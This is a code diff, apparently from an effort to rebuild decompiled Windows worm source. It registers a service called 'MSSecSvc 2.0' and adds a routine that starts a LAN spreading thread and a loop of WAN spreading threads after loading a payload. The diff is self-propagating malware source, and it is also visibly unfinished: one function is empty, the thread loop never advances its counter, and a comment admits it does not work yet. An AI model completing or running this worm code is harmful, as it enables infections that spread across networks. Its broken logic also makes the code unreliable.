@@ -18,6 +18,44 @@
 //globals
 char executable_path[MAX_PATH]; //Get executable path 
 
+HGLOBAL InitCryptoContext()
+{
+
+}
+
+HGLOBAL initializeSockets()
+{
+	WSADATA WSAData;
+	if(WSAStartup(MAKEWORD(2,2), &WSAData))
+	{
+		return 0;
+	}
+	InitCryptoContext(); //CryptAcquireContext
+	return initialize_payload();
+}
+
+HGLOBAL InitOperations()
+{
+	HGLOBAL result;
+	int threadCount;
+	result = initializeSockets();
+	if(result)
+	{
+		hLanSpread = beginthreadex(0, 0, LAN_Spread, 0, 0, 0);
+		if(hLanSpread)
+		{
+			CloseHandle(hLanSpread);
+		}
+		threadCount = 0;
+		do
+		{
+			hWANSpread = beginthreadex(0, 0, WAN_Spread, 0, 0, 0);
+		} while (threadCount < 128);
+		result = 0;
+	}
+	return result;
+}
+
 int create_service()
 {
     SC_HANDLE hSCManager;
@@ -103,7 +141,7 @@ int no_argument_handler()
 }
 
 //Not finished yet, must be fixed for this to work
-SERVICE_STATUS_HANDLE int ServiceMain(int a, int b)
+SERVICE_STATUS_HANDLE ServiceMain()
 {
 	SERVICE_STATUS_HANDLE result;
 	
@@ -122,7 +160,7 @@ SERVICE_STATUS_HANDLE int ServiceMain(int a, int b)
 		ServiceStatus.dwCheckPoint = 4;
 		Servicestatus.dwWaitHint = 0;
 		SetServicestatus(result, &ServiceStatus);
-		sub_407BD0();
+		InitOperations();
 		Sleep(86400000);
 		ExitProcess(1);
 	}
@@ -164,7 +202,6 @@ int RealMain()
   
   ServiceStartTable.lpServiceName = "MSSecSvc 2.0";
   ServiceStartTable.lpServiceProc = (LPSERVICE_MAIN_FUNCTION) ServiceMain;
-                                  /* find out what sub_408000 ( ServiceMain ) is */
 
   return StartServiceCtrlDispatcher(&ServiceStartTable);
 
